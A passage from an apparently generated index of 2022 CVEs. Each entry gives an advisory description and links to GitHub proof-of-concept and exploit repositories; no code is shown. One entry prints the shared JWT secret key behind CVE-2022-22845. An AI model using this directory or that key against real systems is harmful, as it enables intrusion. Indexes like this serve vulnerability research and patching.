- [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner) :  ![starts](https://img.shields.io/github/stars/logpresso/CVE-2021-44228-Scanner.svg) ![forks](https://img.shields.io/github/forks/logpresso/CVE-2021-44228-Scanner.svg)

- [https://github.com/HynekPetrak/log4shell-finder](https://github.com/HynekPetrak/log4shell-finder) :  ![starts](https://img.shields.io/github/stars/HynekPetrak/log4shell-finder.svg) ![forks](https://img.shields.io/github/forks/HynekPetrak/log4shell-finder.svg)

## CVE-2022-23305
 By design, the JDBCAppender in Log4j 1.2.x accepts an SQL statement as a configuration parameter where the values to be inserted are converters from PatternLayout. The message converter, %m, is likely to always be included. This allows attackers to manipulate the SQL by entering crafted strings into input fields or headers of an application that are logged allowing unintended SQL queries to be executed. Note this issue only affects Log4j 1.x when specifically configured to use the JDBCAppender, which is not the default. Beginning in version 2.0-beta8, the JDBCAppender was re-introduced with proper support for parameterized SQL queries and further customization over the columns written to in logs. Apache Log4j 1.2 reached end of life in August 2015. Users should upgrade to Log4j 2 as it addresses numerous other issues from the previous versions.



- [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner) :  ![starts](https://img.shields.io/github/stars/logpresso/CVE-2021-44228-Scanner.svg) ![forks](https://img.shields.io/github/forks/logpresso/CVE-2021-44228-Scanner.svg)

- [https://github.com/HynekPetrak/log4shell-finder](https://github.com/HynekPetrak/log4shell-finder) :  ![starts](https://img.shields.io/github/stars/HynekPetrak/log4shell-finder.svg) ![forks](https://img.shields.io/github/forks/HynekPetrak/log4shell-finder.svg)

- [https://github.com/AlphabugX/CVE-2022-RCE](https://github.com/AlphabugX/CVE-2022-RCE) :  ![starts](https://img.shields.io/github/stars/AlphabugX/CVE-2022-RCE.svg) ![forks](https://img.shields.io/github/forks/AlphabugX/CVE-2022-RCE.svg)

## CVE-2022-23302
 JMSSink in all versions of Log4j 1.x is vulnerable to deserialization of untrusted data when the attacker has write access to the Log4j configuration or if the configuration references an LDAP service the attacker has access to. The attacker can provide a TopicConnectionFactoryBindingName configuration causing JMSSink to perform JNDI requests that result in remote code execution in a similar fashion to CVE-2021-4104. Note this issue only affects Log4j 1.x when specifically configured to use JMSSink, which is not the default. Apache Log4j 1.2 reached end of life in August 2015. Users should upgrade to Log4j 2 as it addresses numerous other issues from the previous versions.



- [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner) :  ![starts](https://img.shields.io/github/stars/logpresso/CVE-2021-44228-Scanner.svg) ![forks](https://img.shields.io/github/forks/logpresso/CVE-2021-44228-Scanner.svg)

- [https://github.com/HynekPetrak/log4shell-finder](https://github.com/HynekPetrak/log4shell-finder) :  ![starts](https://img.shields.io/github/stars/HynekPetrak/log4shell-finder.svg) ![forks](https://img.shields.io/github/forks/HynekPetrak/log4shell-finder.svg)

## CVE-2022-23131
 In the case of instances where the SAML SSO authentication is enabled (non-default), session data can be modified by a malicious actor, because a user login stored in the session was not verified. Malicious unauthenticated actor may exploit this issue to escalate privileges and gain admin access to Zabbix Frontend. To perform the attack, SAML authentication is required to be enabled and the actor has to know the username of Zabbix user (or use the guest account, which is disabled by default).



- [https://github.com/Anonymous-ghost/AttackWebFrameworkTools-5.0](https://github.com/Anonymous-ghost/AttackWebFrameworkTools-5.0) :  ![starts](https://img.shields.io/github/stars/Anonymous-ghost/AttackWebFrameworkTools-5.0.svg) ![forks](https://img.shields.io/github/forks/Anonymous-ghost/AttackWebFrameworkTools-5.0.svg)

- [https://github.com/Mr-xn/cve-2022-23131](https://github.com/Mr-xn/cve-2022-23131) :  ![starts](https://img.shields.io/github/stars/Mr-xn/cve-2022-23131.svg) ![forks](https://img.shields.io/github/forks/Mr-xn/cve-2022-23131.svg)

- [https://github.com/jweny/zabbix-saml-bypass-exp](https://github.com/jweny/zabbix-saml-bypass-exp) :  ![starts](https://img.shields.io/github/stars/jweny/zabbix-saml-bypass-exp.svg) ![forks](https://img.shields.io/github/forks/jweny/zabbix-saml-bypass-exp.svg)

- [https://github.com/0tt7/CVE-2022-23131](https://github.com/0tt7/CVE-2022-23131) :  ![starts](https://img.shields.io/github/stars/0tt7/CVE-2022-23131.svg) ![forks](https://img.shields.io/github/forks/0tt7/CVE-2022-23131.svg)

- [https://github.com/L0ading-x/cve-2022-23131](https://github.com/L0ading-x/cve-2022-23131) :  ![starts](https://img.shields.io/github/stars/L0ading-x/cve-2022-23131.svg) ![forks](https://img.shields.io/github/forks/L0ading-x/cve-2022-23131.svg)

- [https://github.com/1mxml/CVE-2022-23131](https://github.com/1mxml/CVE-2022-23131) :  ![starts](https://img.shields.io/github/stars/1mxml/CVE-2022-23131.svg) ![forks](https://img.shields.io/github/forks/1mxml/CVE-2022-23131.svg)

- [https://github.com/kh4sh3i/CVE-2022-23131](https://github.com/kh4sh3i/CVE-2022-23131) :  ![starts](https://img.shields.io/github/stars/kh4sh3i/CVE-2022-23131.svg) ![forks](https://img.shields.io/github/forks/kh4sh3i/CVE-2022-23131.svg)

- [https://github.com/zwjjustdoit/cve-2022-23131](https://github.com/zwjjustdoit/cve-2022-23131) :  ![starts](https://img.shields.io/github/stars/zwjjustdoit/cve-2022-23131.svg) ![forks](https://img.shields.io/github/forks/zwjjustdoit/cve-2022-23131.svg)

- [https://github.com/trganda/CVE-2022-23131](https://github.com/trganda/CVE-2022-23131) :  ![starts](https://img.shields.io/github/stars/trganda/CVE-2022-23131.svg) ![forks](https://img.shields.io/github/forks/trganda/CVE-2022-23131.svg)

- [https://github.com/pykiller/CVE-2022-23131](https://github.com/pykiller/CVE-2022-23131) :  ![starts](https://img.shields.io/github/stars/pykiller/CVE-2022-23131.svg) ![forks](https://img.shields.io/github/forks/pykiller/CVE-2022-23131.svg)

- [https://github.com/Fa1c0n35/zabbix-cve-2022-23131](https://github.com/Fa1c0n35/zabbix-cve-2022-23131) :  ![starts](https://img.shields.io/github/stars/Fa1c0n35/zabbix-cve-2022-23131.svg) ![forks](https://img.shields.io/github/forks/Fa1c0n35/zabbix-cve-2022-23131.svg)

- [https://github.com/qq1549176285/CVE-2022-23131](https://github.com/qq1549176285/CVE-2022-23131) :  ![starts](https://img.shields.io/github/stars/qq1549176285/CVE-2022-23131.svg) ![forks](https://img.shields.io/github/forks/qq1549176285/CVE-2022-23131.svg)

## CVE-2022-23046
 PhpIPAM v1.4.4 allows an authenticated admin user to inject SQL sentences in the &quot;subnet&quot; parameter while searching a subnet via app/admin/routing/edit-bgp-mapping-search.php



- [https://github.com/dnr6419/CVE-2022-23046](https://github.com/dnr6419/CVE-2022-23046) :  ![starts](https://img.shields.io/github/stars/dnr6419/CVE-2022-23046.svg) ![forks](https://img.shields.io/github/forks/dnr6419/CVE-2022-23046.svg)

- [https://github.com/jcarabantes/CVE-2022-23046](https://github.com/jcarabantes/CVE-2022-23046) :  ![starts](https://img.shields.io/github/stars/jcarabantes/CVE-2022-23046.svg) ![forks](https://img.shields.io/github/forks/jcarabantes/CVE-2022-23046.svg)

## CVE-2022-22947
 In spring cloud gateway versions prior to 3.1.1+ and 3.0.7+ , applications are vulnerable to a code injection attack when the Gateway Actuator endpoint is enabled, exposed and unsecured. A remote attacker could make a maliciously crafted request that could allow arbitrary remote execution on the remote host.



- [https://github.com/Anonymous-ghost/AttackWebFrameworkTools-5.0](https://github.com/Anonymous-ghost/AttackWebFrameworkTools-5.0) :  ![starts](https://img.shields.io/github/stars/Anonymous-ghost/AttackWebFrameworkTools-5.0.svg) ![forks](https://img.shields.io/github/forks/Anonymous-ghost/AttackWebFrameworkTools-5.0.svg)

- [https://github.com/lucksec/Spring-Cloud-Gateway-CVE-2022-22947](https://github.com/lucksec/Spring-Cloud-Gateway-CVE-2022-22947) :  ![starts](https://img.shields.io/github/stars/lucksec/Spring-Cloud-Gateway-CVE-2022-22947.svg) ![forks](https://img.shields.io/github/forks/lucksec/Spring-Cloud-Gateway-CVE-2022-22947.svg)

- [https://github.com/Axx8/CVE-2022-22947_Rce_Exp](https://github.com/Axx8/CVE-2022-22947_Rce_Exp) :  ![starts](https://img.shields.io/github/stars/Axx8/CVE-2022-22947_Rce_Exp.svg) ![forks](https://img.shields.io/github/forks/Axx8/CVE-2022-22947_Rce_Exp.svg)

- [https://github.com/tangxiaofeng7/CVE-2022-22947-Spring-Cloud-Gateway](https://github.com/tangxiaofeng7/CVE-2022-22947-Spring-Cloud-Gateway) :  ![starts](https://img.shields.io/github/stars/tangxiaofeng7/CVE-2022-22947-Spring-Cloud-Gateway.svg) ![forks](https://img.shields.io/github/forks/tangxiaofeng7/CVE-2022-22947-Spring-Cloud-Gateway.svg)

- [https://github.com/chaosec2021/CVE-2022-22947-POC](https://github.com/chaosec2021/CVE-2022-22947-POC) :  ![starts](https://img.shields.io/github/stars/chaosec2021/CVE-2022-22947-POC.svg) ![forks](https://img.shields.io/github/forks/chaosec2021/CVE-2022-22947-POC.svg)

- [https://github.com/carlosevieira/CVE-2022-22947](https://github.com/carlosevieira/CVE-2022-22947) :  ![starts](https://img.shields.io/github/stars/carlosevieira/CVE-2022-22947.svg) ![forks](https://img.shields.io/github/forks/carlosevieira/CVE-2022-22947.svg)

- [https://github.com/Tas9er/SpringCloudGatewayRCE](https://github.com/Tas9er/SpringCloudGatewayRCE) :  ![starts](https://img.shields.io/github/stars/Tas9er/SpringCloudGatewayRCE.svg) ![forks](https://img.shields.io/github/forks/Tas9er/SpringCloudGatewayRCE.svg)

- [https://github.com/Vulnmachines/spring-cve-2022-22947](https://github.com/Vulnmachines/spring-cve-2022-22947) :  ![starts](https://img.shields.io/github/stars/Vulnmachines/spring-cve-2022-22947.svg) ![forks](https://img.shields.io/github/forks/Vulnmachines/spring-cve-2022-22947.svg)

- [https://github.com/aodsec/CVE-2022-22947](https://github.com/aodsec/CVE-2022-22947) :  ![starts](https://img.shields.io/github/stars/aodsec/CVE-2022-22947.svg) ![forks](https://img.shields.io/github/forks/aodsec/CVE-2022-22947.svg)

- [https://github.com/dingxiao77/-cve-2022-22947-](https://github.com/dingxiao77/-cve-2022-22947-) :  ![starts](https://img.shields.io/github/stars/dingxiao77/-cve-2022-22947-.svg) ![forks](https://img.shields.io/github/forks/dingxiao77/-cve-2022-22947-.svg)

- [https://github.com/shakeman8/CVE-2022-22947-RCE](https://github.com/shakeman8/CVE-2022-22947-RCE) :  ![starts](https://img.shields.io/github/stars/shakeman8/CVE-2022-22947-RCE.svg) ![forks](https://img.shields.io/github/forks/shakeman8/CVE-2022-22947-RCE.svg)

- [https://github.com/mrknow001/CVE-2022-22947](https://github.com/mrknow001/CVE-2022-22947) :  ![starts](https://img.shields.io/github/stars/mrknow001/CVE-2022-22947.svg) ![forks](https://img.shields.io/github/forks/mrknow001/CVE-2022-22947.svg)

- [https://github.com/march0s1as/CVE-2022-22947](https://github.com/march0s1as/CVE-2022-22947) :  ![starts](https://img.shields.io/github/stars/march0s1as/CVE-2022-22947.svg) ![forks](https://img.shields.io/github/forks/march0s1as/CVE-2022-22947.svg)

- [https://github.com/Bin4xin/bin4xin.github.io](https://github.com/Bin4xin/bin4xin.github.io) :  ![starts](https://img.shields.io/github/stars/Bin4xin/bin4xin.github.io.svg) ![forks](https://img.shields.io/github/forks/Bin4xin/bin4xin.github.io.svg)

- [https://github.com/wjl110/Spring_CVE_2022_22947](https://github.com/wjl110/Spring_CVE_2022_22947) :  ![starts](https://img.shields.io/github/stars/wjl110/Spring_CVE_2022_22947.svg) ![forks](https://img.shields.io/github/forks/wjl110/Spring_CVE_2022_22947.svg)

- [https://github.com/Wrin9/CVE-2022-22947](https://github.com/Wrin9/CVE-2022-22947) :  ![starts](https://img.shields.io/github/stars/Wrin9/CVE-2022-22947.svg) ![forks](https://img.shields.io/github/forks/Wrin9/CVE-2022-22947.svg)

- [https://github.com/viemsr/spring_cloud_gateway_memshell](https://github.com/viemsr/spring_cloud_gateway_memshell) :  ![starts](https://img.shields.io/github/stars/viemsr/spring_cloud_gateway_memshell.svg) ![forks](https://img.shields.io/github/forks/viemsr/spring_cloud_gateway_memshell.svg)

- [https://github.com/k3rwin/spring-cloud-gateway-rce](https://github.com/k3rwin/spring-cloud-gateway-rce) :  ![starts](https://img.shields.io/github/stars/k3rwin/spring-cloud-gateway-rce.svg) ![forks](https://img.shields.io/github/forks/k3rwin/spring-cloud-gateway-rce.svg)

- [https://github.com/YutuSec/SpEL](https://github.com/YutuSec/SpEL) :  ![starts](https://img.shields.io/github/stars/YutuSec/SpEL.svg) ![forks](https://img.shields.io/github/forks/YutuSec/SpEL.svg)

- [https://github.com/An0th3r/CVE-2022-22947-exp](https://github.com/An0th3r/CVE-2022-22947-exp) :  ![starts](https://img.shields.io/github/stars/An0th3r/CVE-2022-22947-exp.svg) ![forks](https://img.shields.io/github/forks/An0th3r/CVE-2022-22947-exp.svg)

- [https://github.com/darkb1rd/cve-2022-22947](https://github.com/darkb1rd/cve-2022-22947) :  ![starts](https://img.shields.io/github/stars/darkb1rd/cve-2022-22947.svg) ![forks](https://img.shields.io/github/forks/darkb1rd/cve-2022-22947.svg)

- [https://github.com/dbgee/CVE-2022-22947](https://github.com/dbgee/CVE-2022-22947) :  ![starts](https://img.shields.io/github/stars/dbgee/CVE-2022-22947.svg) ![forks](https://img.shields.io/github/forks/dbgee/CVE-2022-22947.svg)

- [https://github.com/helloexp/CVE-2022-22947](https://github.com/helloexp/CVE-2022-22947) :  ![starts](https://img.shields.io/github/stars/helloexp/CVE-2022-22947.svg) ![forks](https://img.shields.io/github/forks/helloexp/CVE-2022-22947.svg)

- [https://github.com/22ke/CVE-2022-22947](https://github.com/22ke/CVE-2022-22947) :  ![starts](https://img.shields.io/github/stars/22ke/CVE-2022-22947.svg) ![forks](https://img.shields.io/github/forks/22ke/CVE-2022-22947.svg)

- [https://github.com/york-cmd/CVE-2022-22947-goby](https://github.com/york-cmd/CVE-2022-22947-goby) :  ![starts](https://img.shields.io/github/stars/york-cmd/CVE-2022-22947-goby.svg) ![forks](https://img.shields.io/github/forks/york-cmd/CVE-2022-22947-goby.svg)

- [https://github.com/nu0l/cve-2022-22947](https://github.com/nu0l/cve-2022-22947) :  ![starts](https://img.shields.io/github/stars/nu0l/cve-2022-22947.svg) ![forks](https://img.shields.io/github/forks/nu0l/cve-2022-22947.svg)

- [https://github.com/Xd-tl/CVE-2022-22947-Rce_POC](https://github.com/Xd-tl/CVE-2022-22947-Rce_POC) :  ![starts](https://img.shields.io/github/stars/Xd-tl/CVE-2022-22947-Rce_POC.svg) ![forks](https://img.shields.io/github/forks/Xd-tl/CVE-2022-22947-Rce_POC.svg)

- [https://github.com/XuCcc/VulEnv](https://github.com/XuCcc/VulEnv) :  ![starts](https://img.shields.io/github/stars/XuCcc/VulEnv.svg) ![forks](https://img.shields.io/github/forks/XuCcc/VulEnv.svg)

- [https://github.com/Greetdawn/CVE-2022-22947](https://github.com/Greetdawn/CVE-2022-22947) :  ![starts](https://img.shields.io/github/stars/Greetdawn/CVE-2022-22947.svg) ![forks](https://img.shields.io/github/forks/Greetdawn/CVE-2022-22947.svg)

- [https://github.com/j-jasson/CVE-2022-22947-Spring-Cloud-Gateway-SpelRCE](https://github.com/j-jasson/CVE-2022-22947-Spring-Cloud-Gateway-SpelRCE) :  ![starts](https://img.shields.io/github/stars/j-jasson/CVE-2022-22947-Spring-Cloud-Gateway-SpelRCE.svg) ![forks](https://img.shields.io/github/forks/j-jasson/CVE-2022-22947-Spring-Cloud-Gateway-SpelRCE.svg)

- [https://github.com/scopion/cve-2022-22947](https://github.com/scopion/cve-2022-22947) :  ![starts](https://img.shields.io/github/stars/scopion/cve-2022-22947.svg) ![forks](https://img.shields.io/github/forks/scopion/cve-2022-22947.svg)

- [https://github.com/hh-hunter/cve-2022-22947-docker](https://github.com/hh-hunter/cve-2022-22947-docker) :  ![starts](https://img.shields.io/github/stars/hh-hunter/cve-2022-22947-docker.svg) ![forks](https://img.shields.io/github/forks/hh-hunter/cve-2022-22947-docker.svg)

- [https://github.com/BerMalBerIst/CVE-2022-22947](https://github.com/BerMalBerIst/CVE-2022-22947) :  ![starts](https://img.shields.io/github/stars/BerMalBerIst/CVE-2022-22947.svg) ![forks](https://img.shields.io/github/forks/BerMalBerIst/CVE-2022-22947.svg)

- [https://github.com/Jun-5heng/CVE-2022-22947](https://github.com/Jun-5heng/CVE-2022-22947) :  ![starts](https://img.shields.io/github/stars/Jun-5heng/CVE-2022-22947.svg) ![forks](https://img.shields.io/github/forks/Jun-5heng/CVE-2022-22947.svg)

- [https://github.com/PaoPaoLong-lab/Spring-CVE-2022-22947-](https://github.com/PaoPaoLong-lab/Spring-CVE-2022-22947-) :  ![starts](https://img.shields.io/github/stars/PaoPaoLong-lab/Spring-CVE-2022-22947-.svg) ![forks](https://img.shields.io/github/forks/PaoPaoLong-lab/Spring-CVE-2022-22947-.svg)

- [https://github.com/bysinks/CVE-2022-22947](https://github.com/bysinks/CVE-2022-22947) :  ![starts](https://img.shields.io/github/stars/bysinks/CVE-2022-22947.svg) ![forks](https://img.shields.io/github/forks/bysinks/CVE-2022-22947.svg)

- [https://github.com/michaelklaan/CVE-2022-22947-Spring-Cloud](https://github.com/michaelklaan/CVE-2022-22947-Spring-Cloud) :  ![starts](https://img.shields.io/github/stars/michaelklaan/CVE-2022-22947-Spring-Cloud.svg) ![forks](https://img.shields.io/github/forks/michaelklaan/CVE-2022-22947-Spring-Cloud.svg)

- [https://github.com/Summer177/Spring-Cloud-Gateway-CVE-2022-22947](https://github.com/Summer177/Spring-Cloud-Gateway-CVE-2022-22947) :  ![starts](https://img.shields.io/github/stars/Summer177/Spring-Cloud-Gateway-CVE-2022-22947.svg) ![forks](https://img.shields.io/github/forks/Summer177/Spring-Cloud-Gateway-CVE-2022-22947.svg)

- [https://github.com/ba1ma0/Spring-Cloud-GateWay-CVE-2022-22947-demon-code](https://github.com/ba1ma0/Spring-Cloud-GateWay-CVE-2022-22947-demon-code) :  ![starts](https://img.shields.io/github/stars/ba1ma0/Spring-Cloud-GateWay-CVE-2022-22947-demon-code.svg) ![forks](https://img.shields.io/github/forks/ba1ma0/Spring-Cloud-GateWay-CVE-2022-22947-demon-code.svg)

## CVE-2022-22919
 Adenza AxiomSL ControllerView through 10.8.1 allows redirection for SSO login URLs.



- [https://github.com/jdordonezn/CVE-2022-22919](https://github.com/jdordonezn/CVE-2022-22919) :  ![starts](https://img.shields.io/github/stars/jdordonezn/CVE-2022-22919.svg) ![forks](https://img.shields.io/github/forks/jdordonezn/CVE-2022-22919.svg)

## CVE-2022-22909
 HotelDruid v3.0.3 was discovered to contain a remote code execution (RCE) vulnerability which is exploited via an attacker inserting a crafted payload into the name field under the Create New Room module.



- [https://github.com/kaal18/CVE-2022-22909](https://github.com/kaal18/CVE-2022-22909) :  ![starts](https://img.shields.io/github/stars/kaal18/CVE-2022-22909.svg) ![forks](https://img.shields.io/github/forks/kaal18/CVE-2022-22909.svg)

- [https://github.com/0z09e/CVE-2022-22909](https://github.com/0z09e/CVE-2022-22909) :  ![starts](https://img.shields.io/github/stars/0z09e/CVE-2022-22909.svg) ![forks](https://img.shields.io/github/forks/0z09e/CVE-2022-22909.svg)

## CVE-2022-22852
 A Stored Cross Site Scripting (XSS) vulnerability exists in Sourcecodtester Hospital's Patient Records Management System 1.0 via the description parameter in room_list.



- [https://github.com/Sant268/CVE-2022-22852](https://github.com/Sant268/CVE-2022-22852) :  ![starts](https://img.shields.io/github/stars/Sant268/CVE-2022-22852.svg) ![forks](https://img.shields.io/github/forks/Sant268/CVE-2022-22852.svg)

## CVE-2022-22851
 A Stored Cross Site Scripting (XSS) vulnerability exists in Sourcecodtester Hospital's Patient Records Management System 1.0 via the specialization parameter in doctors.php



- [https://github.com/Sant268/CVE-2022-22851](https://github.com/Sant268/CVE-2022-22851) :  ![starts](https://img.shields.io/github/stars/Sant268/CVE-2022-22851.svg) ![forks](https://img.shields.io/github/forks/Sant268/CVE-2022-22851.svg)

## CVE-2022-22850
 A Stored Cross Site Scripting (XSS) vulnerability exists in Sourcecodtester Hospital's Patient Records Management System 1.0 via the description parameter in room_types.



- [https://github.com/Sant268/CVE-2022-22850](https://github.com/Sant268/CVE-2022-22850) :  ![starts](https://img.shields.io/github/stars/Sant268/CVE-2022-22850.svg) ![forks](https://img.shields.io/github/forks/Sant268/CVE-2022-22850.svg)

## CVE-2022-22845
 QXIP SIPCAPTURE homer-app before 1.4.28 for HOMER 7.x has the same 167f0db2-f83e-4baa-9736-d56064a5b415 JWT secret key across different customers' installations.



- [https://github.com/OmriBaso/CVE-2022-22845-Exploit](https://github.com/OmriBaso/CVE-2022-22845-Exploit) :  ![starts](https://img.shields.io/github/stars/OmriBaso/CVE-2022-22845-Exploit.svg) ![forks](https://img.shields.io/github/forks/OmriBaso/CVE-2022-22845-Exploit.svg)

## CVE-2022-22828
 An insecure direct object reference for the file-download URL in Synametrics SynaMan before 5.0 allows a remote attacker to access unshared files via a modified base64-encoded filename string.



- [https://github.com/videnlabs/CVE-2022-22828](https://github.com/videnlabs/CVE-2022-22828) :  ![starts](https://img.shields.io/github/stars/videnlabs/CVE-2022-22828.svg) ![forks](https://img.shields.io/github/forks/videnlabs/CVE-2022-22828.svg)

## CVE-2022-22718
 Windows Print Spooler Elevation of Privilege Vulnerability. This CVE ID is unique from CVE-2022-21997, CVE-2022-21999, CVE-2022-22717.



- [https://github.com/ly4k/SpoolFool](https://github.com/ly4k/SpoolFool) :  ![starts](https://img.shields.io/github/stars/ly4k/SpoolFool.svg) ![forks](https://img.shields.io/github/forks/ly4k/SpoolFool.svg)

- [https://github.com/Al1ex/WindowsElevation](https://github.com/Al1ex/WindowsElevation) :  ![starts](https://img.shields.io/github/stars/Al1ex/WindowsElevation.svg) ![forks](https://img.shields.io/github/forks/Al1ex/WindowsElevation.svg)

## CVE-2022-22600
 The issue was addressed with improved permissions logic. This issue is fixed in tvOS 15.4, iOS 15.4 and iPadOS 15.4, macOS Monterey 12.3, watchOS 8.5. A malicious application may be able to bypass certain Privacy preferences.



- [https://github.com/KlinKlinKlin/MSF-screenrecord-on-MacOS](https://github.com/KlinKlinKlin/MSF-screenrecord-on-MacOS) :  ![starts](https://img.shields.io/github/stars/KlinKlinKlin/MSF-screenrecord-on-MacOS.svg) ![forks](https://img.shields.io/github/forks/KlinKlinKlin/MSF-screenrecord-on-MacOS.svg)

## CVE-2022-22588
 A resource exhaustion issue was addressed with improved input validation. This issue is fixed in iOS 15.2.1 and iPadOS 15.2.1. Processing a maliciously crafted HomeKit accessory name may cause a denial of service.



- [https://github.com/trevorspiniolas/homekitdos](https://github.com/trevorspiniolas/homekitdos) :  ![starts](https://img.shields.io/github/stars/trevorspiniolas/homekitdos.svg) ![forks](https://img.shields.io/github/forks/trevorspiniolas/homekitdos.svg)

## CVE-2022-22582
 ** RESERVED ** This candidate has been reserved by an organization or individual that will use it when announcing a new security problem. When the candidate has been publicized, the details for this candidate will be provided.



- [https://github.com/poizon-box/CVE-2022-22582](https://github.com/poizon-box/CVE-2022-22582) :  ![starts](https://img.shields.io/github/stars/poizon-box/CVE-2022-22582.svg) ![forks](https://img.shields.io/github/forks/poizon-box/CVE-2022-22582.svg)

## CVE-2022-22536
 SAP NetWeaver Application Server ABAP, SAP NetWeaver Application Server Java, ABAP Platform, SAP Content Server 7.53 and SAP Web Dispatcher are vulnerable for request smuggling and request concatenation. An unauthenticated attacker can prepend a victim's request with arbitrary data. This way, the attacker can execute functions impersonating the victim or poison intermediary Web caches. A successful attack could result in complete compromise of Confidentiality, Integrity and Availability of the system.



- [https://github.com/antx-code/CVE-2022-22536](https://github.com/antx-code/CVE-2022-22536) :  ![starts](https://img.shields.io/github/stars/antx-code/CVE-2022-22536.svg) ![forks](https://img.shields.io/github/forks/antx-code/CVE-2022-22536.svg)

## CVE-2022-22296
 Sourcecodester Hospital's Patient Records Management System 1.0 is vulnerable to Insecure Permissions via the id parameter in manage_user endpoint. Simply change the value and data of other users can be displayed.



- [https://github.com/vlakhani28/CVE-2022-22296](https://github.com/vlakhani28/CVE-2022-22296) :  ![starts](https://img.shields.io/github/stars/vlakhani28/CVE-2022-22296.svg) ![forks](https://img.shields.io/github/forks/vlakhani28/CVE-2022-22296.svg)

## CVE-2022-21999
 Windows Print Spooler Elevation of Privilege Vulnerability. This CVE ID is unique from CVE-2022-21997, CVE-2022-22717, CVE-2022-22718.



- [https://github.com/ly4k/SpoolFool](https://github.com/ly4k/SpoolFool) :  ![starts](https://img.shields.io/github/stars/ly4k/SpoolFool.svg) ![forks](https://img.shields.io/github/forks/ly4k/SpoolFool.svg)

## CVE-2022-21974
 Roaming Security Rights Management Services Remote Code Execution Vulnerability.



- [https://github.com/0vercl0k/CVE-2022-21974](https://github.com/0vercl0k/CVE-2022-21974) :  ![starts](https://img.shields.io/github/stars/0vercl0k/CVE-2022-21974.svg) ![forks](https://img.shields.io/github/forks/0vercl0k/CVE-2022-21974.svg)

## CVE-2022-21971
 Windows Runtime Remote Code Execution Vulnerability.



- [https://github.com/0vercl0k/CVE-2022-21971](https://github.com/0vercl0k/CVE-2022-21971) :  ![starts](https://img.shields.io/github/stars/0vercl0k/CVE-2022-21971.svg) ![forks](https://img.shields.io/github/forks/0vercl0k/CVE-2022-21971.svg)

## CVE-2022-21907
 HTTP Protocol Stack Remote Code Execution Vulnerability.



- [https://github.com/ZZ-SOCMAP/CVE-2022-21907](https://github.com/ZZ-SOCMAP/CVE-2022-21907) :  ![starts](https://img.shields.io/github/stars/ZZ-SOCMAP/CVE-2022-21907.svg) ![forks](https://img.shields.io/github/forks/ZZ-SOCMAP/CVE-2022-21907.svg)

- [https://github.com/p0dalirius/CVE-2022-21907-http.sys](https://github.com/p0dalirius/CVE-2022-21907-http.sys) :  ![starts](https://img.shields.io/github/stars/p0dalirius/CVE-2022-21907-http.sys.svg) ![forks](https://img.shields.io/github/forks/p0dalirius/CVE-2022-21907-http.sys.svg)

- [https://github.com/mauricelambert/CVE-2022-21907](https://github.com/mauricelambert/CVE-2022-21907) :  ![starts](https://img.shields.io/github/stars/mauricelambert/CVE-2022-21907.svg) ![forks](https://img.shields.io/github/forks/mauricelambert/CVE-2022-21907.svg)

- [https://github.com/coconut20/CVE-2022-21907-RCE-POC](https://github.com/coconut20/CVE-2022-21907-RCE-POC) :  ![starts](https://img.shields.io/github/stars/coconut20/CVE-2022-21907-RCE-POC.svg) ![forks](https://img.shields.io/github/forks/coconut20/CVE-2022-21907-RCE-POC.svg)

- [https://github.com/corelight/cve-2022-21907](https://github.com/corelight/cve-2022-21907) :  ![starts](https://img.shields.io/github/stars/corelight/cve-2022-21907.svg) ![forks](https://img.shields.io/github/forks/corelight/cve-2022-21907.svg)

- [https://github.com/michelep/CVE-2022-21907-Vulnerability-PoC](https://github.com/michelep/CVE-2022-21907-Vulnerability-PoC) :  ![starts](https://img.shields.io/github/stars/michelep/CVE-2022-21907-Vulnerability-PoC.svg) ![forks](https://img.shields.io/github/forks/michelep/CVE-2022-21907-Vulnerability-PoC.svg)

- [https://github.com/RtlCyclone/CVE_2022_21907-poc](https://github.com/RtlCyclone/CVE_2022_21907-poc) :  ![starts](https://img.shields.io/github/stars/RtlCyclone/CVE_2022_21907-poc.svg) ![forks](https://img.shields.io/github/forks/RtlCyclone/CVE_2022_21907-poc.svg)

- [https://github.com/xiska62314/CVE-2022-21907](https://github.com/xiska62314/CVE-2022-21907) :  ![starts](https://img.shields.io/github/stars/xiska62314/CVE-2022-21907.svg) ![forks](https://img.shields.io/github/forks/xiska62314/CVE-2022-21907.svg)

## CVE-2022-21882
 Win32k Elevation of Privilege Vulnerability. This CVE ID is unique from CVE-2022-21887.



- [https://github.com/KaLendsi/CVE-2022-21882](https://github.com/KaLendsi/CVE-2022-21882) :  ![starts](https://img.shields.io/github/stars/KaLendsi/CVE-2022-21882.svg) ![forks](https://img.shields.io/github/forks/KaLendsi/CVE-2022-21882.svg)

- [https://github.com/Al1ex/WindowsElevation](https://github.com/Al1ex/WindowsElevation) :  ![starts](https://img.shields.io/github/stars/Al1ex/WindowsElevation.svg) ![forks](https://img.shields.io/github/forks/Al1ex/WindowsElevation.svg)

- [https://github.com/L4ys/CVE-2022-21882](https://github.com/L4ys/CVE-2022-21882) :  ![starts](https://img.shields.io/github/stars/L4ys/CVE-2022-21882.svg) ![forks](https://img.shields.io/github/forks/L4ys/CVE-2022-21882.svg)

- [https://github.com/sailay1996/cve-2022-21882-poc](https://github.com/sailay1996/cve-2022-21882-poc) :  ![starts](https://img.shields.io/github/stars/sailay1996/cve-2022-21882-poc.svg) ![forks](https://img.shields.io/github/forks/sailay1996/cve-2022-21882-poc.svg)

- [https://github.com/r1l4-i3pur1l4/CVE-2022-21882](https://github.com/r1l4-i3pur1l4/CVE-2022-21882) :  ![starts](https://img.shields.io/github/stars/r1l4-i3pur1l4/CVE-2022-21882.svg) ![forks](https://img.shields.io/github/forks/r1l4-i3pur1l4/CVE-2022-21882.svg)

- [https://github.com/David-Honisch/CVE-2022-21882](https://github.com/David-Honisch/CVE-2022-21882) :  ![starts](https://img.shields.io/github/stars/David-Honisch/CVE-2022-21882.svg) ![forks](https://img.shields.io/github/forks/David-Honisch/CVE-2022-21882.svg)

## CVE-2022-21877
 Storage Spaces Controller Information Disclosure Vulnerability.



- [https://github.com/Big5-sec/cve-2022-21877](https://github.com/Big5-sec/cve-2022-21877) :  ![starts](https://img.shields.io/github/stars/Big5-sec/cve-2022-21877.svg) ![forks](https://img.shields.io/github/forks/Big5-sec/cve-2022-21877.svg)

## CVE-2022-21661
